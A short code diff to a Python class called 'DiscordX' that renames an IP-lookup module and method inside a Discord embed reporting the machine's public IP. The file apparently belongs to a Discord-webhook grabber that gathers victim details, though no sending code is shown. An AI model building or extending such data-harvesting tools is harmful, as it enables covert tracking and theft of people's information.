@@ -2,7 +2,7 @@ from json import loads, dumps
 from urllib.request import Request, urlopen
 from config import Config 
 cc = Config()
-from informations import Info
+from ipinf import Info
 ifx = Info()
 
 class DiscordX(): #Updating soon
@@ -300,7 +300,7 @@ class DiscordX(): #Updating soon
                     },
                     {
                         "name": ":globe_with_meridians:   -   IP:",
-                        "value": f"```{ifx.get_ip()}```",
+                        "value": f"```{ifx.get_public_ip()}```",
                         "inline": True,
                     },
                     {
